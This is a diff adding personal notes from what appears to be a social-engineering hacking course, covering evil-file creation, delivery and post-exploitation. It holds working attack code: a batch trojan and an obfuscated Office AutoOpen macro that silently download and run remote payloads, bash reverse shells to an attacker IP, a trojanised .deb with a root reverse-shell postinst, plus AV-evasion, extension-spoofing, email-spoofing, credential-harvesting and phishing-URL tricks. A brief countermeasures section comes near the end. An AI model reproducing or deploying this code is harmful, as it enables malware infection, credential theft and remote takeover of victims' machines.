@@ -1,0 +1,271 @@
+#Social Engineering
+It is the art of manipulating people
+
+#Social Engineering Steps
+Information Gathering
+Generating evil files
+Enhancing evil files
+Delivery methods
+Post exploitation
+
+*************************************************************************************************************************
+#Extra
+>We should take screenshot of the VM's so that we can restore whenever we want
+>To make any executable run in the startup of the system then go to regedit and pass an entry there--
+"Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
+>Lazagne					//very powerful tool to recover passwords
+>Perfect spying tool will have lazagne that will help in getting the saved passwords while the keylogger will help in getting the future passwords
+>To run an exe file in linux we need "wine"
+>Bat to EXE convertor		//www.f2ko.de       	or autoit exe convertor(more trusted)
+>Applying the icon to the trojan			//www.easyicon.net/convert   and the icon can be applied from the above software
+>www.iconverticons.com				//online site to apply icons
+>route -n 						//(linux) to view the gateway
+>Port forwarding				//Attacking outside the network
+>uname -a 						//info of the computer
+
+
+
+#Generating Undetectable backdoors
+Veil framework
+TheFatRat															(powershell backdoor)
+Empire					//uses different way to bypass the AV 		(powershell backdoor)
+Metasploit framework is the "best"
+
+>Changing the source code of the powershell generated backdoor--
+Edit the bat file and see which part of the code is triggering the AV
+We can add arguement such as "/min" to make the window minimize and thus changing the whole signature of the file
+Try to make it totally undetectable
+
+
+
+#Enhancing evil files:
+Modifying the Hex value---Need an HEX editor named "HxD"		//www.mh-nexus.de
+
+#Changing the extension:
+zaid-pdf.exe
+zaid-fdp.exe				(right to left overide character)
+>>zaid-exe.pdf			
+But when dowloading from browser it will become original, so we need to send the exe in a zip format
+
+
+#Creating a trojan:
+@echo off
+
+set files='url1','url2'
+
+powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
+
+In this code we need to set the direct url of the backdoor and the file that we want the user to see and also this enables to let the program run in the invisible mode
+
+
+#Trojan in ms office docs--
+Use windows/macro in the "empire" tool
+and create macro in the word document and also save the file with the .doc file extension
+
+Sub AutoOpen()
+    Dim cc As String
+    cc = "pow"
+    cc = cc + "ers"
+    cc = cc + "hell "
+    cc = cc + "-NoP -NonI -W Hidden """
+    
+    cc = cc + "('url1','url2')"
+    
+    cc = cc + "|foreach{$fileName=$env:temp+'\'+(Split-Path -Path $_ -Leaf);"
+    
+    cc = cc + "(new-object System.Net.WebClient).DownloadFile($_,$fileName);"
+    
+    cc = cc + "Invoke-Item $fileName;}"
+    
+    cc = cc + """"
+
+    VBA.CreateObject("WScript.Shell").Run cc, 0
+
+End Sub
+
+Here in the url place we can download the executable file and thus the backdoor will get run
+This whole script will be stored in the macro of the office document
+
+
+
+
+##MacOS backdoor
+When we run the backdoor in the mac os the file comes at the status bar.
+To hide it we need to right click on the backdoor and show package contents and then pass an entry in the .plist file(this file contains all the entries of the executable
+<key>NSUIElement</key>
+<string>1</string>
+
+
+
+##Hacking linux
+bash -i >& /dev/tcp/192.168.10.2/8080 0>&1		//this lets the tcp connection establish between this computer and the IP address
+
+Embeding evil code in the executable package (deb file)
+They run by double clicking on it
+Go to ubuntu debian packages and evil code will be embeded into that particular debian package
+>>dpkg -x flashsfs.deb 	flash_update				//extracting data from deb file
+
+dpkg -x flashsfs.deb 	flash_update				
+tar -x flashsfs.deb 									//this will take out 3 files
+From these 3 files pick up the control.tar.gz and extract it
+Now open the "control" folder and copy the file "control" and "postinst". If not then just copy "control"
+Now paste this files in the folder "flash_update" by creating a directory named "DEBIAN" and paste there.
+Now make a file named "postinst" and write the evil code there--(we can write any code we want to execute)
+#!/bin/bash
+sudo bash -i >& /dev/tcp/192.168.10.2/8080 0>&1	
+
+Now after saving the file, change the permission of this file to executable "postinst"
+Now we need to package in the same way as before so we will package this by--
+dpkg-deb --build flash_update
+
+and as soon as the victim will install it we will get the root permission
+
+
+
+##Hacking Android
+Download any app from apkmirror.com
+We need to set the java 8 as default in kali as kali will use the latest java which will not be able to create the backdoor
+To set this---
+update-alternatives --config java 					(and select the java 8 no.)
+We will do it using TheFatRat tool(simple)
+
+
+
+#Delivery Methods:
+
+First Scenario--
+If we send the emails from the spoof mailers then the message is marked as spam so we should set our own SMTP server
+SMTP server---sendgrid.com					and follow the signup process and generate smtp relay
+
+To communicate it with Kali Linux there is a tool named "sendemail  --help" 
+sendemail -s smtp.sendgrid.net:25 -xu apikey -xp sejselgjes -f "m.askar@isecurity.org" -t "zaid@isecurity.org" -u "Check this out" -m "Here is the research paper  http://www.dropbox.com/fake.zip?dl=1(set this to 1 so it will automatically download the file) -o message-header="From: Mohammad Askar <m.askar@isecurity.org>"(advanced tools) 
+
+And this will look same as that the real person has sent us with their photo and email id which is awesome
+
+
+
+
+Second Scenario--
+We can send the victim the command that will give us the reverse shell but we can't give this to a more technical person
+sudo setsid(lets you run in the background) bash -i >& /dev/tcp/192.168.10.2/8080 0>&1	
+send it using www.anonymousemail.me
+
+
+
+Third Scenario:--
+Creating a replica of the login page---
+Using addon of mozilla firefox i.e. web scrapbook
+
+Stealing login info using toolkit--
+setoolkit
+and then using credential harvester to get the information that the user is typing
+
+
+
+Fourth scenario:--
+Using beef to hook the victim through browser
+We will be attacking on google analytics to attack the webpage or the youtube channel as most users enabled the google analytics to view the traffic
+Now to launch this attack we need Tracking ID and we can get this from right clicking the webpage and search for "google analytics" and we will get the tracking of webpage starting from "UA" and youtube accounts "YT".
+Copy the number that is written in front of them
+Now open "setoolkit" and then third party modules and then google analytics 
+Fill in all the details and then print the payload.
+It will generate a lot of traffic beacuse of which the admin of the website will see "Oh This website is creating a lot of traffic. lets see this website"
+Now as soon as the user go to the website, he is hooked and thus we got an access to the victim.
+
+
+"pretty theft" can get a prompt to get the credentials
+"Microsoft clippy icon" to get the software update popup 
+"Fake notification(firefox)"	helps to provide the fake notification bar at the top
+"Fake flash update" helps to privde a fake flash update
+
+
+
+
+
+
+#Post exploitation:
+use exploit/windows/local/persistence
+and show options
+and then show advanced
+set exe:Custom backdoor.exe 
+
+>This can be done on all OS
+
+
+#Pivoting:
+Trying to gain access to others using the hacked device
+use post/windows/manage/autoroute						//(using autoroute)
+show options   				(subnet will be 192.168.10.0 even if the network is 192.168.10.22)
+
+
+#Security against Social Engineering:
+1.Checking for the spoofed mails--Look closely at the "from" field,Verify message source
+2.Protecting against Beef---NoScript security suite	//this will disable javascript from running
+3.Detecting Trojans--Check the properties of the file and that will provide you with the correct information
+4.Run the trojan in the sandbox 			//www.hybrid-analysis.com
+This will give you the detailed information and also run the trojan on virtual machine only
+
+
+
+Defend Social Engineering--
+Virus discovery methods
+Educate employees
+Scanning the virus
+Integrity checking
+Interception and getting knowledge of virus
+
+
+"Master list" of countermeasures--
+Host based solutions(Anti-Virus)
+Create a policy
+Watch Downloading
+Update software
+Attachment Issues like email,and other platforms
+Know about the source of the file that you are donwloading
+Keep informed of new things
+
+
+Always assume the humans can be compromised
+
+Principle of least privelege--It requires that a process,program,user must be able to access only the information and resources that are necessary for its legitimate purpose(access control)
+
+
+How resilient is a system against an attacker who has victim's credentials?
+Multi step and Side channel indentity verification
+Design system with the expectation that the people will be compromised
+Always remember that the system will never be fullproof
+
+
+
+
+
+
+
+
+
+Social Engineering--
+Tailgating---Entering with someone to pass the gate permissions
+Vishing---Voice type phishing
+
+Use "Social Engineers toolkit" tool and "Credential Harvester" tool to make the site clone and get the username and password
+
+
+In spear phishing we send the email to the user and when he clicks that details are sent to the attacker
+We need to copy the facebook official message and forward it and change the each link inside the email so that any link clicked will be gone to the phishing page and thus details are with us
+
+
+http://www.facebook.com@google.com					//will send the page to the google.com
+http://www.facebook.com@172.10.54.32				//this will also send it to the google.com@172
+http://www.facebook.com@12425736241				//this is the conversion of ip address to interger and getting it more trickier
+
+How to avoid phishing----
+We need to teach them how to spot these type of links and tell them about these weird numbers
+We are using https and also if any email comes from the facebook then we need to verify it by going to www.facebook.com rather than going from the link
+
+"Netcraft toolbar" also has add ons to be installed and it catches the suspicious web pages which look like phishing
+
+
+
+
+
+#ends
